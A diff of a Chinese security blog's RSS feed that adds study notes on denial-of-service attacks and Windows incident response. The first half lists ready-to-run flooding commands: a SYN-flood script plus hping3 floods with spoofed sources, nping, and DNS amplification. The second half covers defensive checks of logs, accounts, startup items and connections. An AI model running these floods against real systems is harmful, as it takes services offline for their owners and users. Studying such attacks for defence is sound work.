@@ -7,7 +7,223 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Tue, 16 Dec 2025 18:07:16 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/%E7%BD%91%E5%AE%89/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 18 Dec 2025 22:46:46 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/%E7%BD%91%E5%AE%89/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>1.15 DOS补充和Win应急响应</title>
+        <link>https://www.retr0.xyz/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link>
+        <pubDate>Thu, 18 Dec 2025 22:46:46 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</guid>
+        <description>&lt;h2 id=&#34;dos补充&#34;&gt;DOS补充
+&lt;/h2&gt;&lt;h3 id=&#34;syn洪水攻击syn-flood&#34;&gt;SYN洪水攻击（Syn Flood）
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Python-SYN-Flood-Attack-Tool
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 py3_synflood_cmd.py -t &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -p &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;端口号&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -c &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;dns放大攻击&#34;&gt;DNS放大攻击
+&lt;/h3&gt;&lt;p&gt;典型的流量放大攻击，以小汇多，利用协议特定进行放大流量&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install dnsutils
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 使用&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dig ANY &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;域名&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; @&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DNS地址，例如114.114.114.114&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。&lt;/p&gt;
+&lt;h3 id=&#34;hping3&#34;&gt;hping3
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;定制发送任何的数据包&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;参数解释：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-a&lt;/code&gt;伪造数据包&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-q&lt;/code&gt;不返回&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-n&lt;/code&gt;不解析域名&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-s&lt;/code&gt;源端口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-d&lt;/code&gt;字节数&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-p&lt;/code&gt;端口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;--flood&lt;/code&gt;以flood形式进行攻击&lt;/p&gt;
+&lt;h4 id=&#34;syn-flood&#34;&gt;syn-flood
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -c &lt;span class=&#34;m&#34;&gt;3000&lt;/span&gt; -d &lt;span class=&#34;m&#34;&gt;120&lt;/span&gt; -S -w &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt; -p &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;端口号&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --flood --rand-source &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或（简化版）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -S -P -p &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; --flood --rand-source &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;tcp-flood&#34;&gt;tcp-flood
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -SARUFP -p &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;端口号&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --flood --rand-source &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;icmp-flood&#34;&gt;icmp-flood
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -q -n -a 1.1.1.1 --icmp -d &lt;span class=&#34;m&#34;&gt;56&lt;/span&gt; --flood &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;udp-flood&#34;&gt;udp-flood
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -a 1.1.1.1 --udp -s &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; -d &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -p &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; --flood &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;land&#34;&gt;LAND
+&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo hping3 -n -a &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -S -d &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -p &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; --flood &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;tcp全链接dos攻击&#34;&gt;TCP全链接DOS攻击
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt; 命令中的数据任意，够大就行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nping --tcp-connect --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10000&lt;/span&gt; -c &lt;span class=&#34;m&#34;&gt;10000000000&lt;/span&gt; -q &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;目标ip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;应急响应&#34;&gt;应急响应
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;如果我被黑客入侵了会发生什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;web入侵：&lt;/strong&gt; 挂马、网页篡改、植入webshell、黑页、暗链等&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;主机入侵：&lt;/strong&gt; 病毒木马、勒索病毒、远控后门、系统异常、RDP爆破、SSH爆破、主机漏洞、数据库入侵等&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络攻击：&lt;/strong&gt; DDOS/CC攻击、ARP攻击、DNS/HTTP劫持&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;路由器交换机攻击：&lt;/strong&gt; 内网病毒、配置错误、机器本身漏洞&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;查看日志&#34;&gt;查看日志
+&lt;/h3&gt;&lt;h4 id=&#34;使用日志查看器&#34;&gt;使用日志查看器
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;方法一：&lt;/strong&gt; 使用&lt;code&gt;Win+R&lt;/code&gt;并输入mmc打开控制台根节点，在工具栏中选择 &lt;strong&gt;文件&amp;ndash;添加/删除管理单元&amp;ndash;事件查看器&lt;/strong&gt; 并添加&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法二：&lt;/strong&gt; 右键桌面上的“此电脑”，点击“管理”，选择事件查看器即可。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法三：&lt;/strong&gt; 使用&lt;code&gt;Win+R&lt;/code&gt;并输入&lt;code&gt;eventvwr.msc&lt;/code&gt;回车即可&lt;/p&gt;
+&lt;h4 id=&#34;windows日志位置&#34;&gt;Windows日志位置：
+&lt;/h4&gt;&lt;p&gt;Windows 2000/2003/xp：&lt;code&gt;\%Systemroot%\System32\Config\*.evt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Windows vista/7/8及以后：&lt;code&gt;\%Systemroot%\System32\winevt\Logs\*evtx&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;检查账户&#34;&gt;检查账户
+&lt;/h3&gt;&lt;h4 id=&#34;图形化界面检查&#34;&gt;图形化界面检查
+&lt;/h4&gt;&lt;p&gt;可以在刚才的mmc中 &lt;strong&gt;添加本地用户和组&lt;/strong&gt; ，也可以在“此电脑”的 &lt;strong&gt;管理&lt;/strong&gt; 中打开&lt;/p&gt;
+&lt;p&gt;检查Guest账户是否开启、是否存在隐藏账户等&lt;/p&gt;
+&lt;h4 id=&#34;通过注册表检查&#34;&gt;通过注册表检查
+&lt;/h4&gt;&lt;p&gt;转到&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\&lt;/code&gt;下，检查其中名字较长的几个文件夹是否有可以账户存在&lt;/p&gt;
+&lt;h3 id=&#34;文件分析&#34;&gt;文件分析
+&lt;/h3&gt;&lt;h4 id=&#34;检查临时目录&#34;&gt;检查临时目录
+&lt;/h4&gt;&lt;p&gt;转到&lt;code&gt;C:\Users\Administrator\Local Settings\Temp&lt;/code&gt;（必须直接敲完整路径，不然找不到）&lt;/p&gt;
+&lt;p&gt;检查桌面文件夹&lt;code&gt;C:\Users\Administrator\Desktop&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;检查访问记录&#34;&gt;检查访问记录
+&lt;/h4&gt;&lt;p&gt;转到&lt;code&gt;C:\Users\Administrator\Recent&lt;/code&gt;（必须直接敲完整路径，不然找不到）&lt;/p&gt;
+&lt;p&gt;这是最近访问的文件&lt;/p&gt;
+&lt;h4 id=&#34;检查文件修改时间&#34;&gt;检查文件修改时间
+&lt;/h4&gt;&lt;h4 id=&#34;检查hosts文件&#34;&gt;检查hosts文件
+&lt;/h4&gt;&lt;h3 id=&#34;网络行为排查&#34;&gt;网络行为排查
+&lt;/h3&gt;&lt;p&gt;使用网络沙箱：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.virustotal.com/gui/home/upload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;TotalVirus&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://s.threatbook.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;微步云沙箱&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;检查备案情况：&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://beian.miit.gov.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ICP/IP地址/域名信息备案管理系统&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;直接Google&lt;/p&gt;
+&lt;h3 id=&#34;网络连接排查&#34;&gt;网络连接排查
+&lt;/h3&gt;&lt;p&gt;cmd执行：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;netstat -ano&lt;/code&gt;	查看可疑连接和进程&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tasklist&lt;/code&gt;		找到可疑进程&lt;/p&gt;
+&lt;h3 id=&#34;流量分析&#34;&gt;流量分析
+&lt;/h3&gt;&lt;p&gt;使用WireShark、Charles&lt;/p&gt;
+&lt;h3 id=&#34;漏洞和补丁信息&#34;&gt;漏洞和补丁信息
+&lt;/h3&gt;&lt;p&gt;命令&lt;code&gt;systeminfo&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;打开Windows自动更新&lt;/p&gt;
+&lt;h3 id=&#34;网络攻击的判断与防御&#34;&gt;网络攻击的判断与防御
+&lt;/h3&gt;&lt;h4 id=&#34;ddos通用防御&#34;&gt;DDOS通用防御
+&lt;/h4&gt;&lt;p&gt;限制单ip请求、负载均衡、cdn、禁止icm、隐藏真实ip、流量清洗、优化tcp/ip栈、代码合理使用缓存、cdn云清洗&lt;/p&gt;
+&lt;h4 id=&#34;syn攻击判断&#34;&gt;syn攻击判断
+&lt;/h4&gt;&lt;p&gt;服务器cpu占用率高，大量SYN_RECEIVED网络连接状态，网络恢复后负载瞬间变高，断开后负载下降】&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御：&lt;/strong&gt; 提高半开放连接队列的大小&lt;/p&gt;
+&lt;h4 id=&#34;udp攻击判断&#34;&gt;udp攻击判断
+&lt;/h4&gt;&lt;p&gt;服务器cpu占用率高，每秒大量数据包，tcp正常&lt;/p&gt;
+&lt;h4 id=&#34;cc攻击&#34;&gt;cc攻击
+&lt;/h4&gt;&lt;p&gt;服务器cpu占用率高，web服务器出现service unavailable提示，大量establish网络连接，单ip高达上百，用户无法正常访问&lt;/p&gt;
+&lt;h4 id=&#34;dns放大攻击-1&#34;&gt;DNS放大攻击
+&lt;/h4&gt;&lt;p&gt;大量的dns请求&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御：&lt;/strong&gt; ips规则，关闭递归查询，DNS解析器只接受受信任的域名服务，acl&lt;/p&gt;
+&lt;h4 id=&#34;arp欺骗判断&#34;&gt;ARP欺骗判断
+&lt;/h4&gt;&lt;p&gt;cmd执行&lt;code&gt;arp -a&lt;/code&gt;查看mac地址是否重复，特别是网关&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御：&lt;/strong&gt; 防火墙，mac地址绑定&lt;/p&gt;
+&lt;h3 id=&#34;可疑进程分析&#34;&gt;可疑进程分析
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;tasklist&lt;/code&gt;查看进程&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;名称随机，后缀也不是exe的是可疑进程&lt;/li&gt;
+&lt;li&gt;任务管理器中svchost.exe运行的权限太过普通（例如你的用户名）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;code&gt;tasklist | findstr 进程名称&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;可以使用 &lt;strong&gt;pchunter&lt;/strong&gt; 软件查看&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wmic process | find &amp;quot;进程id&amp;quot; &amp;gt; proc.csv&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;tasklist /svc&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;启动项排查&#34;&gt;启动项排查
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;排查以下几个位置：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;其他见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.14 自启动和DOS攻击初步&lt;/a&gt;的2.2部分&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;code&gt;Win+R&lt;/code&gt;输入&lt;code&gt;msconfig&lt;/code&gt;在 &lt;strong&gt;启动&lt;/strong&gt; 选项卡中查看启动项（高版本Windows可能移动到任务管理器中）&lt;/li&gt;
+&lt;li&gt;排查&lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;排查是否有可疑的服务&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;计划任务排查&#34;&gt;计划任务排查
+&lt;/h3&gt;&lt;p&gt;排查&lt;code&gt;C:\Windows\System32\Tasks&lt;/code&gt;和&lt;code&gt;C:\Windows\Tasks&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;也可以在mmc或者此电脑的管理中查看计划任务&lt;/p&gt;
+&lt;h3 id=&#34;特定事件痕迹&#34;&gt;特定事件痕迹
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;挖矿程序&lt;/li&gt;
+&lt;li&gt;勒索病毒&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>1.14 自启动和DOS攻击初步</title>
         <link>https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/</link>
         <pubDate>Tue, 16 Dec 2025 18:07:16 +0800</pubDate>
